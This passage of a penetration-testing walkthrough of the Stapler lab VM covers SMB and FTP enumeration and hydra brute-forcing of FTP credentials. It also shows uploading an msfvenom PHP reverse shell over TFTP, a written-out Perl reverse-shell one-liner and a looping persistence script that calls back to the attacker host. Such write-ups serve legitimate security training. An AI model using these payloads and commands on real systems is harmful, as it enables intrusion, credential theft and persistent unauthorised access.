font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>No encoder or badchars specified, outputting raw payload</div><div>Payload size: 3034 bytes</div></div><div><br/></div><div>To make it an acceptable plugin, we have to add some meta data to the top of the file.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>&lt;?php</div><div>/**</div><div> * Plugin Name: Security Check</div><div> * Version: 1.2</div><div> * Author: r00t Security</div><div> * Author URI: http://www.r00tsec.com</div><div> * License: GPL2</div><div> */</div><div>      @error_reporting(0);</div><div>[...]</div></div><div><br/></div><div>Now we have to zip our file and upload it.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# zip secheck.zip rev.php</div><div>  adding: rev.php (deflated 67%)</div></div><div><br/></div><div>To upload, in WordPress...</div><ol><li><div>Click Plugins in the menu on the left</div></li><li><div>Click the Add New button at the top of the page</div></li><li><div>Click the Upload Plugin button at the top of the page</div></li><li><div>Click the Choose File button and select the ZIP</div></li><li><div>Click Install Now</div></li></ol><div><br/></div><div>Oops! Looks like we have to have FTP credentials to upload our plugin. This is typically caused because the user running the web service (www-data, apache, etc) doesn't have permission to write to the plugins directory.</div><div><br/></div><div><img height="844" src="/assets/images/2019-04-15-stapler/7FF20648-0C53-49D0-8B7D-30BF0178B1C4.png" width="2260"/><br/></div><div><br/></div><div>I tried brute forcing FTP credentials with the usernames we have from WordPress (using hydra), but get nothing.</div><div><br/></div><div>I tried to edit a Theme to insert my own shell code. That didn't work. The themes are not editable.</div><div><br/></div><div>I tried to use the Metasploit module to exploit the Authenticated Code Execution issue with WordPress, but it failed doing its base64 decode test.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>use exploit/multi/http/wp_crop_rce</div></div><div><br/></div><div>This WordPress site is starting to feel like a dead end. Let's see what other services we can poke at.</div><div><br/></div><div>The server has SMB available. Let's run enum4linux to see what we can find out.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>enum4linux 10.183.0.194</div></div><div><br/></div><div>Looks like we found some shares we can look at.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div> ========================================= </div><div>|    Share Enumeration on 10.183.0.194    |</div><div> ========================================= </div><div><div><br/></div></div><div>        Sharename       Type      Comment</div><div>        ---------       ----      -------</div><div>        print$          Disk      Printer Drivers</div><div>        kathy           Disk      Fred, What are we doing here?</div><div>        tmp             Disk      All temporary files should be stored here</div><div>        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))</div><div><br/></div><div>[...]</div><div><br/></div><div>[+] Attempting to map shares on 10.183.0.194</div><div>//10.183.0.194/print$   Mapping: DENIED, Listing: N/A</div><div>//10.183.0.194/kathy    Mapping: OK, Listing: OK</div><div>//10.183.0.194/tmp      Mapping: OK, Listing: OK</div><div>//10.183.0.194/IPC$     [E] Can't understand response:</div></div><div><br/></div><div>We also were able to get a list of users.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''</div><div>S-1-22-1-1000 Unix User\peter (Local User)</div><div>S-1-22-1-1001 Unix User\RNunemaker (Local User)</div><div>S-1-22-1-1002 Unix User\ETollefson (Local User)</div><div>S-1-22-1-1003 Unix User\DSwanger (Local User)</div><div>S-1-22-1-1004 Unix User\AParnell (Local User)</div><div>S-1-22-1-1005 Unix User\SHayslett (Local User)</div><div>S-1-22-1-1006 Unix User\MBassin (Local User)</div><div>S-1-22-1-1007 Unix User\JBare (Local User)</div><div>S-1-22-1-1008 Unix User\LSolum (Local User)</div><div>S-1-22-1-1009 Unix User\IChadwick (Local User)</div><div>S-1-22-1-1010 Unix User\MFrei (Local User)</div><div>S-1-22-1-1011 Unix User\SStroud (Local User)</div><div>S-1-22-1-1012 Unix User\CCeaser (Local User)</div><div>S-1-22-1-1013 Unix User\JKanode (Local User)</div><div>S-1-22-1-1014 Unix User\CJoo (Local User)</div><div>S-1-22-1-1015 Unix User\Eeth (Local User)</div><div>S-1-22-1-1016 Unix User\LSolum2 (Local User)</div><div>S-1-22-1-1017 Unix User\JLipps (Local User)</div><div>S-1-22-1-1018 Unix User\jamie (Local User)</div><div>S-1-22-1-1019 Unix User\Sam (Local User)</div><div>S-1-22-1-1020 Unix User\Drew (Local User)</div><div>S-1-22-1-1021 Unix User\jess (Local User)</div><div>S-1-22-1-1022 Unix User\SHAY (Local User)</div><div>S-1-22-1-1023 Unix User\Taylor (Local User)</div><div>S-1-22-1-1024 Unix User\mel (Local User)</div><div>S-1-22-1-1025 Unix User\kai (Local User)</div><div>S-1-22-1-1026 Unix User\zoe (Local User)</div><div>S-1-22-1-1027 Unix User\NATHAN (Local User)</div><div>S-1-22-1-1028 Unix User\www (Local User)</div><div>S-1-22-1-1029 Unix User\elly (Local User)</div></div><div><br/></div><div>The first user listed, 'peter' is an administrator on the WordPress site. We see the user 'zoe' again as well. Elly was also a WordPress user.</div><div><br/></div><div>Let's try to connect to the SMB shares and see what they contain. First, we'll connect to the kathy share (anonymously) using smbclient.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler/smb# smbclient //10.183.0.194/kathy -U " "%" "</div><div>Try "help" to get a list of possible commands.</div><div>smb: \&gt; ls</div><div>  .                                   D        0  Fri Jun  3 12:52:52 2016</div><div>  ..                                  D        0  Mon Jun  6 17:39:56 2016</div><div>  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016</div><div>  backup                              D        0  Sun Jun  5 11:04:14 2016</div><div><div><br/></div></div><div>                19478204 blocks of size 1024. 16018012 blocks available</div></div><div><br/></div><div>Let's check out the backup directory first. Backups are notorious for having sensitive information in them.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>smb: \&gt; cd backup</div><div>smb: \backup\&gt; ls</div><div>  .                                   D        0  Sun Jun  5 11:04:14 2016</div><div>  ..                                  D        0  Fri Jun  3 12:52:52 2016</div><div>  vsftpd.conf                         N     5961  Sun Jun  5 11:03:45 2016</div><div>  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 13:14:46 2015</div><div><div><br/></div></div><div>                19478204 blocks of size 1024. 16018012 blocks available</div></div><div><br/></div><div>We see a backup of the FTP service configuration as well as a backup of the WordPress site. Let's download both so we can check them out.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>smb: \backup\&gt; get vsftpd.conf vsftpd.conf</div><div>getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (970.2 KiloBytes/sec) (average 831.6 KiloBytes/sec)</div><div>smb: \backup\&gt; get wordpress-4.tar.gz wordpress-4.tar.gz</div><div>getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (11224.7 KiloBytes/sec) (average 10966.7 KiloBytes/sec)</div></div><div><br/></div><div>Let's also drop back and check out the kathy_stuff folder.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>smb: \backup\&gt; cd ..</div><div>smb: \&gt; cd kathy_stuff</div><div>smb: \kathy_stuff\&gt; ls</div><div>  .                                   D        0  Sun Jun  5 11:02:27 2016</div><div>  ..                                  D        0  Fri Jun  3 12:52:52 2016</div><div>  todo-list.txt                       N       64  Sun Jun  5 11:02:27 2016</div><div><div><br/></div></div><div>                19478204 blocks of size 1024. 16018008 blocks available</div><div>smb: \kathy_stuff\&gt; get todo-list.txt todo-list.txt</div><div>getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (6.9 KiloBytes/sec) (average 10794.6 KiloBytes/sec)</div></div><div><br/></div><div>Before digging into the files we downloaded, let's check out the /tmp share as well.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler/smb# smbclient //10.183.0.194/tmp -U " "%" "</div><div>Try "help" to get a list of possible commands.</div><div>smb: \&gt; ls</div><div>  .                                   D        0  Tue Jun  7 04:08:39 2016</div><div>  ..                                  D        0  Mon Jun  6 17:39:56 2016</div><div>  ls                                  N      274  Sun Jun  5 11:32:58 2016</div><div><div><br/></div></div><div>                19478204 blocks of size 1024. 16018008 blocks available</div></div><div><br/></div><div>The share only contains a single 'ls' file. Downloading and viewing the file contents, it appears to be a listing of the system's /tmp directory. Maybe this tmp share maps directly to the system's /tmp directory. With that in mind, I try to upload a file to the directory... and it works! Good to know.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>smb: \&gt; put tmp-ls my-tmp-ls</div><div>putting file tmp-ls as \my-tmp-ls (44.6 kb/s) (average 44.6 kb/s)</div><div>smb: \&gt; ls</div><div>  .                                   D        0  Fri Apr 19 10:44:48 2019</div><div>  ..                                  D        0  Mon Jun  6 17:39:56 2016</div><div>  my-tmp-ls                           A      274  Fri Apr 19 10:44:48 2019</div><div>  ls                                  N      274  Sun Jun  5 11:32:58 2016</div><div><div><br/></div></div><div>                19478204 blocks of size 1024. 16018004 blocks available</div></div><div><br/></div><div>Now, let's dig into our downloaded files. </div><div><br/></div><div>The wordpress-4.tar.gz looks like it only contains a clean download of WordPress. A wp-config.php file doesn't exist. 😞</div><div><br/></div><div>Next, we'll take a look at vsftpd.conf.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler/smb# cat vsftpd.conf | grep -v '^#' | grep -v '^$'</div><div>listen=YES</div><div>listen_ipv6=NO</div><div>anonymous_enable=YES</div><div>anon_root=/var/ftp/anonymous</div><div>local_enable=YES</div><div>dirmessage_enable=YES</div><div>use_localtime=YES</div><div>xferlog_enable=YES</div><div>connect_from_port_20=YES</div><div>banner_file=/etc/vsftpd.banner</div><div>chroot_local_user=YES</div><div>userlist_enable=YES</div><div>local_root=/etc</div><div>secure_chroot_dir=/var/run/vsftpd/empty</div><div>pam_service_name=vsftpd</div><div>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</div><div>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</div><div>ssl_enable=NO</div><div>pasv_enable=no</div></div><div><br/></div><div>The first thing we notice is that anonymous FTP access is allowed. We haven't even looked at the FTP service much (beyond trying to brute force passwords). Let's connect to it anonymously real quick and just see what is out there.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# ftp 10.183.0.194</div><div>Connected to 10.183.0.194.</div><div>220-</div><div>220-|-----------------------------------------------------------------------------------------|</div><div>220-| Harry, make sure to update the banner when you get a chance to show who has access here |</div><div>220-|-----------------------------------------------------------------------------------------|</div><div>220-</div><div>220</div><div>Name (10.183.0.194:root): anonymous</div><div>331 Please specify the password.  </div><div>Password:</div><div>230 Login successful.</div><div>Remote system type is UNIX.</div><div>Using binary mode to transfer files.</div><div>ftp&gt; ls</div><div>200 PORT command successful. Consider using PASV.</div><div>150 Here comes the directory listing.</div><div>-rw-r--r--    1 0        0             107 Jun 03  2016 note</div><div>226 Directory send OK.</div><div><div>ftp&gt; get note note</div><div>local: note remote: note</div><div>200 PORT command successful. Consider using PASV.</div><div>150 Opening BINARY mode data connection for note (107 bytes).</div><div>226 Transfer complete.</div><div>107 bytes received in 0.00 secs (30.9882 kB/s)</div></div></div><div><br/></div><div>The only file available is 'note'. We downloaded that and it contains the following...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# cat note</div><div>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</div></div><div><br/></div><div>Elly and John were both WordPress users. So was Harry (referenced in the FTP banner).</div><div><br/></div><div>From the note, it seems we can be pretty sure Elly is a valid FTP user. Also, everywhere we've seen Elly's account listed, it has just been her name, so we can feel pretty confident her FTP account username is just 'elly'. Let's try brute forcing the FTP service one more time to try to find her credentials.</div><div><br/></div><div>We'll start by checking the obvious variations by using the '-e nsr' option. (try "n" null password, "s" login as pass and/or "r" reversed login)</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# hydra -o ftp-crack -L wordpress-users -e nsr ftp://10.183.0.194</div><div>Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</div><div><div><br/></div></div><div>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-19 18:18:22</div><div>[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:10/p:3), ~2 tries per task</div><div>[DATA] attacking ftp://10.183.0.194:21/</div><div>[21][ftp] host: 10.183.0.194   login: elly   password: ylle</div><div>1 of 1 target successfully completed, 1 valid password found</div><div>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-19 18:18:29</div></div><div><br/></div><div>Well, there you go. Didn't need a massive dictionary after all. Let's try to connect to the FTP service with Elly's credentials. <span style="font-style: italic;">(NOTE: We also verified these credentials work for Elly's account on the WordPress site.)</span></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# ftp 10.183.0.194</div><div>Connected to 10.183.0.194.</div><div>220- </div><div>220-|-----------------------------------------------------------------------------------------|</div><div>220-| Harry, make sure to update the banner when you get a chance to show who has access here |</div><div>220-|-----------------------------------------------------------------------------------------|</div><div>220- </div><div>220  </div><div>Name (10.183.0.194:root): elly</div><div>331 Please specify the password.</div><div>Password:</div><div>230 Login successful.</div><div>Remote system type is UNIX.</div><div>Using binary mode to transfer files.</div></div><div><br/></div><div>Nice! The other thing that stood out in the vsftpd.conf file is that 'local_root' was set to /etc. That means we should be able to pull down all/most of the victim's configuration files. We might also be able to write to files. Let's check it out.</div><div><br/></div><div>First, we'll try to download as much as we can with wget.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler/etc# mkdir etc</div><div>root@kali:~/Walkthroughs/stapler/etc# cd etc</div><div>root@kali:~/Walkthroughs/stapler/etc# wget --no-passive -m --user=elly --password=ylle ftp://10.183.0.194</div></div><div><br/></div><div>Looking at the phpmyadmin.conf config file (for Apache), we see the phpmyadmin site is still setup to allow access to /phpmyadmin/setup. It is using Basic auth, so we should be able to (at least try) brute force the credentials.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div># Authorize for setup</div><div>&lt;Directory /usr/share/phpmyadmin/setup&gt;</div><div>    &lt;IfModule mod_authz_core.c&gt;</div><div>        &lt;IfModule mod_authn_file.c&gt;</div><div>            AuthType Basic</div><div>            AuthName "phpMyAdmin Setup"</div><div>            AuthUserFile /etc/phpmyadmin/htpasswd.setup</div><div>        &lt;/IfModule&gt;</div><div>        Require valid-user</div><div>    &lt;/IfModule&gt;</div><div>&lt;/Directory&gt;</div></div><div><br/></div><div>Looks like the /phpmyadmin/setup page is available if we have the right credentials. Let's see if we can view the /etc/phpmyadmin/htpasswd.setup file. Nope. Don't have permission. Can't access /etc/phpmyadmin/config-db.php either.</div><div><br/></div><div>Looking at the rc.local file, we see how the HTTP service on TCP port 80 is started along with what home directory it is serving files out of.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler/etc/10.183.0.194# cat rc.local </div><div>#!/bin/sh -e</div><div>#</div><div># rc.local</div><div>#</div><div># This script is executed at the end of each multiuser runlevel.</div><div># Make sure that the script will "exit 0" on success or any other</div><div># value on error.</div><div>#</div><div># In order to enable or disable this script just change the execution</div><div># bits.</div><div>#</div><div># By default this script does nothing.</div><div>/root/fix-wordpress.sh</div><div>/root/python.sh &amp;&gt;/dev/null &amp;</div><div>/usr/local/src/nc.sh &amp;&gt;/dev/null &amp;</div><div>su -c 'authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null' www &amp;&gt;/dev/null &amp;</div><div>exit 0</div></div><div><br/></div><div>Let's see if any other config files contain the '/home/www' path.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler/etc/10.183.0.194# grep -ri '/home/www' *</div><div>default/atftpd:OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /home/www"</div><div>passwd:www:x:1028:1028::/home/www:</div><div>rc.local:su -c 'authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null' www &amp;&gt;/dev/null &amp;</div></div><div><br/></div><div>Interesting. According to the default/atftpd file, there is a TFTP service that is saving files in /home/www. 😄 BINGO! We should be able to upload our PHP reverse shll to the directory using TFTP and then access it from the HTTP service on TCP port 80.</div><div><br/></div><div>I'll create my PHP reverse shell with msfvenom.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>No encoder or badchars specified, outputting raw payload</div><div>Payload size: 3043 bytes</div></div><div><br/></div><div>Now, I'll upload it to /home/www using TFTP.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# tftp</div><div>tftp&gt; connect 10.183.0.194</div><div>tftp&gt; put rev.php</div><div>Sent 3153 bytes in 0.0 seconds</div></div><div><br/></div><div>That seemed to work. I'll start my handler for the reverse PHP shell on TCP port 5432 and a second listener for a generic reverse shell on TCP port 5433. I like to do this because the PHP reverse shell doesn't stay active for long.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 0.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div><div>msf5 exploit(multi/handler) &gt; </div><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div><div>LPORT =&gt; 5433</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 1.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5433</div></div><div><br/></div><div>Moment of truth. Let's request our reverse shell using curl.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.194:40572) at 2019-04-20 00:38:19 -0400</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions 1</div><div>[*] Starting interaction with 1...</div><div><div><br/></div></div><div>pwd</div><div>/home/www</div><div>id</div><div>uid=1028(www) gid=1028(www) groups=1028(www)</div><div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' &amp;</div><div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.194:37464) at 2019-04-20 00:39:00 -0400</div></div><div><br/></div><div>Great! We got our PHP reverse shell connected, then started another reverse shell using perl.</div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>My www account doesn't have a default shell defined, so I won't be able to SSH to the server with this account.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:~$ grep `whoami` /etc/passwd</div><div>www:x:1028:1028::/home/www:</div></div><div><br/></div><div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# cat thumbs</div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div><div>root@kali:~/Walkthroughs/stapler# python -m SimpleHTTPServer 4321</div><div>Serving HTTP on 0.0.0.0 port 4321 ...</div></div><div><br/></div><div>I 